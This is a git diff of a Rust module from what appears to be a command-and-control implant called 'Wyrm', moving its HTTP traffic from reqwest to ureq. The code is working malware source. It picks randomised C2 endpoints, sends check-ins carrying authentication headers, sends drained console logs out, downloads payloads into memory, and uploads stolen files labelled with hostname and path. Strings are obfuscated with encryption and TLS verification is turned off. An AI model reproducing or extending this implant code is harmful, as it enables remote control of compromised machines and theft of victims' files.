@@ -1,33 +1,50 @@
 //! Implant communications are handled here.
 
-use std::{fs, mem::take, path::Path};
+use std::{fs::File, mem::take, path::Path};
 
 use crate::{
-    utils::{console::CONSOLE_LOG, time_utils::epoch_now},
+    utils::{console::get_console_log, time_utils::epoch_now},
     wyrm::Wyrm,
 };
-// use minreq::Response;
-use rand::Rng;
-use reqwest::{
-    Url,
-    blocking::{
-        ClientBuilder, Response,
-        multipart::{Form, Part},
-    },
-    header::{AUTHORIZATION, CONTENT_TYPE, HeaderMap, USER_AGENT, WWW_AUTHENTICATE},
-    redirect::Policy,
+use rand::{
+    Rng, SeedableRng, TryRngCore,
+    rngs::{OsRng, SmallRng},
 };
+
 use shared::{
     net::{TasksNetworkStream, XorEncode, decode_http_response, encode_u16buf_to_u8buf},
     pretty_print::print_failed,
     tasks::{Command, ExfiltratedFile, Task},
 };
 use str_crypter::{decrypt_string, sc};
+use ureq::{
+    Agent, Body, Proxy,
+    config::Config,
+    http::{
+        HeaderMap, Response,
+        header::{AUTHORIZATION, CONTENT_TYPE, USER_AGENT, WWW_AUTHENTICATE},
+    },
+    tls::{TlsConfig, TlsProvider},
+    unversioned::multipart::{Form, Part},
+};
 
 /// Constructs the C2 URL by randomly choosing the URI to visit.
 pub fn construct_c2_url(implant: &Wyrm) -> String {
-    let mut rng = rand::rng();
-    let i = rng.random_range(0..implant.c2_config.api_endpoints.len());
+    let i = {
+        // N.b. we have to use non TLS rand here or the RDLL will crash
+        let len = implant.c2_config.api_endpoints.len();
+        if len != 0 {
+            let mut seed = [0u8; 32];
+            if let Ok(_) = OsRng.try_fill_bytes(&mut seed) {
+                let mut rng = SmallRng::from_seed(seed);
+                rng.random_range(0..len)
+            } else {
+                0
+            }
+        } else {
+            0
+        }
+    };
 
     let uri = &implant.c2_config.api_endpoints[i];
     const COLON_SZ: usize = 1;
@@ -53,7 +70,7 @@ pub fn construct_c2_url(implant: &Wyrm) -> String {
 }
 
 /// Checks in with the C2 and gets any pending tasks.
-pub fn comms_http_check_in(implant: &mut Wyrm) -> Result<Vec<Task>, reqwest::Error> {
+pub fn comms_http_check_in(implant: &mut Wyrm) -> Result<Vec<Task>, ureq::Error> {
     let formatted_url = construct_c2_url(implant);
     let sec_token = &implant.c2_config.security_token;
     let ua = &implant.c2_config.useragent;
@@ -61,20 +78,21 @@ pub fn comms_http_check_in(implant: &mut Wyrm) -> Result<Vec<Task>, reqwest::Err
 
     // Drain the console log and put it into a completed task
     {
-        let mut log = CONSOLE_LOG.lock().unwrap();
-        if !log.is_empty() {
-            let drained = take(&mut *log);
-            // Note task 1 will always be for console logs as we hardcode this via sql migration when the srv starts up
-            // for the first time.
-            implant.push_completed_task(
-                &Task::from(1, Command::ConsoleMessages, None),
-                Some(drained),
-            );
+        if let Ok(mut log) = get_console_log().lock() {
+            if !log.is_empty() {
+                let drained = take(&mut *log);
+                // Note task 1 will always be for console logs as we hardcode this via sql migration when the srv starts up
+                // for the first time.
+                implant.push_completed_task(
+                    &Task::from(1, Command::ConsoleMessages, None),
+                    Some(drained),
+                );
+            }
         }
     }
 
     // Make the actual request, depending upon whether we have data to upload or not
-    let response = if implant.completed_tasks.is_empty() {
+    let mut response = if implant.completed_tasks.is_empty() {
         http_get(formatted_url.clone(), headers, implant)?
     } else {
         http_post_tasks(formatted_url.clone(), implant, headers)?
@@ -102,27 +120,35 @@ pub fn comms_http_check_in(implant: &mut Wyrm) -> Result<Vec<Task>, reqwest::Err
         return Ok(tasks);
     }
 
-    let response_bytes = response.bytes().unwrap_or_default();
-    Ok(decode_tasks_stream(&response_bytes))
+    let res = response.body_mut().read_to_vec()?;
+    Ok(decode_tasks_stream(&res))
 }
 
-fn http_get(url: String, headers: HeaderMap, implant: &Wyrm) -> Result<Response, reqwest::Error> {
-    let dest = Url::parse(&url).unwrap();
+fn http_get(
+    url: String,
+    headers: HeaderMap,
+    implant: &Wyrm,
+) -> Result<Response<Body>, ureq::Error> {
+    let agent = generate_http_agent(implant);
 
-    let client_builder = reqwest::blocking::ClientBuilder::new();
-    let client_builder = implant.apply_proxy_for_c2_url(&url, client_builder)?;
+    let mut req = agent.get(url);
 
-    let client = client_builder.default_headers(headers).build()?;
-    client.get(dest).send()
+    for (name, value) in headers.iter() {
+        if let Ok(val) = value.to_str() {
+            req = req.header(name, val);
+        }
+    }
+
+    req.call()
 }
 
 fn http_post_tasks(
     url: String,
     implant: &mut Wyrm,
     mut headers: HeaderMap,
-) -> Result<Response, reqwest::Error> {
-    let client_builder = reqwest::blocking::ClientBuilder::new();
-    let client_builder = implant.apply_proxy_for_c2_url(&url, client_builder)?;
+) -> Result<Response<Body>, ureq::Error> {
+    let agent = generate_http_agent(implant);
+    let mut req = agent.post(url);
 
     let mut completed_tasks: TasksNetworkStream = Vec::new();
 
@@ -138,21 +164,20 @@ fn http_post_tasks(
         completed_tasks.push(encoded_byte_response);
     }
 
-    let serialised_post_body: Vec<u8> =
-        serde_json::to_vec(&completed_tasks).expect("could not ser");
-
     headers.insert(CONTENT_TYPE, "application/json".parse().unwrap());
 
-    let client = client_builder.default_headers(headers).build()?;
+    for (name, value) in headers.iter() {
+        if let Ok(val) = value.to_str() {
+            req = req.header(name, val);
+        }
+    }
 
     // TODO domain fronting in the above builder?
-    client.post(url).body(serialised_post_body).send()
+    req.send_json(completed_tasks)
 }
 
 /// Generates some generic headers which we send along with the HTTP request to the C2.
-/// These are to be the same for GET, POST, etc. Includes:
-///
-/// - Implant ID
+/// These are to be the same for GET, POST, etc.
 fn generate_generic_headers(implant_id: &str, security_token: &str, ua: &str) -> HeaderMap {
     let mut headers = HeaderMap::new();
     headers.insert(WWW_AUTHENTICATE, implant_id.parse().unwrap());
@@ -192,7 +217,7 @@ pub fn decode_tasks_stream(byte_response: &[u8]) -> Vec<Task> {
 /// has for some reason, exit.
 ///
 /// Function pulls configuration settings down, and sends local config up where required for that first check-in.
-pub fn configuration_connection(implant: &mut Wyrm) -> Result<Vec<Task>, reqwest::Error> {
+pub fn configuration_connection(implant: &mut Wyrm) -> Result<Vec<Task>, ureq::Error> {
     implant.conduct_first_run_recon();
 
     //
@@ -203,7 +228,7 @@ pub fn configuration_connection(implant: &mut Wyrm) -> Result<Vec<Task>, reqwest
     let sec_token = &implant.c2_config.security_token;
     let ua = &implant.c2_config.useragent;
     let headers = generate_generic_headers(&implant.implant_id, sec_token, ua);
-    let response = http_post_tasks(formatted_url.clone(), implant, headers)?;
+    let mut response = http_post_tasks(formatted_url.clone(), implant, headers)?;
 
     //
     // We get back some settings from the C2
@@ -228,7 +253,7 @@ pub fn configuration_connection(implant: &mut Wyrm) -> Result<Vec<Task>, reqwest
         return Ok(tasks);
     }
 
-    Ok(decode_tasks_stream(&response.bytes().unwrap_or_default()))
+    Ok(decode_tasks_stream(&response.body_mut().read_to_vec()?))
 }
 
 /// Downloads a file to a buffer in memory
@@ -237,82 +262,102 @@ pub fn configuration_connection(implant: &mut Wyrm) -> Result<Vec<Task>, reqwest
 /// As this function downloads a file **in memory**, ensure you are not downloading something massive with this
 /// as it will cause the device to run OOM. If that functionality is necessary, then make a streaming function which
 /// downloads to a file over a stream.
-pub fn download_file_with_uri_in_memory(uri: &str, wyrm: &Wyrm) -> Result<Vec<u8>, reqwest::Error> {
+pub fn download_file_with_uri_in_memory(uri: &str, wyrm: &Wyrm) -> Result<Vec<u8>, ureq::Error> {
     let formatted_url = format!("{}:{}{}", wyrm.c2_config.url, wyrm.c2_config.port, uri);
     let sec_token = &wyrm.c2_config.security_token;
     let ua = &wyrm.c2_config.useragent;
     let headers = generate_generic_headers(&wyrm.implant_id, sec_token, ua);
 
-    let response = http_get(formatted_url, headers, wyrm)?;
+    let mut response = http_get(formatted_url, headers, wyrm)?;
 
-    Ok(response.bytes().unwrap_or_default().to_vec())
+    Ok(response.body_mut().read_to_vec()?)
 }
 
 pub fn upload_file_as_stream(implant: &Wyrm, ef: &ExfiltratedFile) {
-    let Ok(file) = fs::File::open(&ef.file_path) else {
-        print_failed(format!(
-            "{} {}",
-            sc!("Could not open file.", 96).unwrap(),
-            ef.file_path,
-        ));
-        return;
-    };
-    let len = match file.metadata() {
-        Ok(f) => f.len(),
-        Err(e) => {
-            print_failed(format!(
-                "{}. {e}",
-                sc!("Failed to get file len.", 85).unwrap()
-            ));
-            return;
-        }
-    };
-
-    let Ok(part) = Part::reader_with_length(file, len)
-        .file_name(
-            Path::new(&ef.file_path)
-                .file_name()
-                .unwrap_or_default()
-                .to_string_lossy()
-                .into_owned(),
-        )
-        .mime_str("application/octet-stream")
-    else {
-        print_failed(format!("{}", sc!("Could not construct part.", 74).unwrap()));
-        return;
-    };
-
-    let form = Form::new()
-        .text(sc!("hostname", 47).unwrap(), ef.hostname.clone())
-        .text(sc!("source_path", 98).unwrap(), ef.file_path.clone())
-        .part(sc!("file", 92).unwrap(), part);
-
     let url = construct_c2_url(implant);
+
     let headers = generate_generic_headers(
         &implant.implant_id,
         &implant.c2_config.security_token,
         &implant.c2_config.useragent,
     );
-    let cb = ClientBuilder::new();
-    let Ok(cb) = implant.apply_proxy_for_c2_url(&url, cb) else {
-        print_failed(format!(
-            "{}",
-            sc!("Failed to look for proxy during upload.", 63).unwrap()
-        ));
-        return;
+
+    let agent = generate_http_agent(implant);
+
+    let hostname = ef.hostname.clone();
+    let source_path = ef.file_path.clone();
+
+    let file_name = Path::new(&source_path)
+        .file_name()
+        .unwrap_or_default()
+        .to_string_lossy()
+        .into_owned();
+
+    let file = match File::open(&source_path) {
+        Ok(f) => f,
+        Err(_) => {
+            print_failed(format!(
+                "{} {}",
+                sc!("Could not open file.", 96).unwrap(),
+                source_path
+            ));
+            return;
+        }
     };
 
-    let client = cb
-        .default_headers(headers)
-        .redirect(Policy::none())
-        .timeout(None)
-        .build()
+    let part = Part::owned_reader(file)
+        .file_name(&file_name)
+        .mime_str("application/octet-stream")
         .unwrap();
 
-    if let Err(e) = client.post(url).multipart(form).send() {
-        print_failed(format!(
-            "{} {e}",
-            sc!("Could not send file to C2.", 72).unwrap()
-        ));
-    };
+    let form = Form::new()
+        .text("hostname", &hostname)
+        .text("source_path", &source_path)
+        .part("file", part);
+
+    let mut req = agent.post(&url);
+
+    for (k, v) in headers.iter() {
+        req = req.header(k, v);
+    }
+
+    match req.send(form) {
+        Ok(_resp) => (),
+        Err(e) => {
+            print_failed(format!(
+                "{} {e}",
+                sc!("Could not send file to c2.", 72).unwrap()
+            ));
+        }
+    }
+}
+
+fn generate_http_agent(implant: &Wyrm) -> Agent {
+    if let Some(px) = implant.try_get_proxy() {
+        let px = Proxy::new(&px).unwrap();
+        let config = Config::builder()
+            .tls_config(
+                TlsConfig::builder()
+                    .provider(TlsProvider::NativeTls)
+                    .disable_verification(true)
+                    .build(),
+            )
+            .proxy(Some(px))
+            .build();
+
+        config.into()
+    } else {
+        let config: Config = Config::builder()
+            .tls_config(
+                TlsConfig::builder()
+                    .provider(TlsProvider::NativeTls)
+                    .disable_verification(true)
+                    .build(),
+            )
+            .proxy(None)
+            .build()
+            .into();
+
+        config.into()
+    }
 }
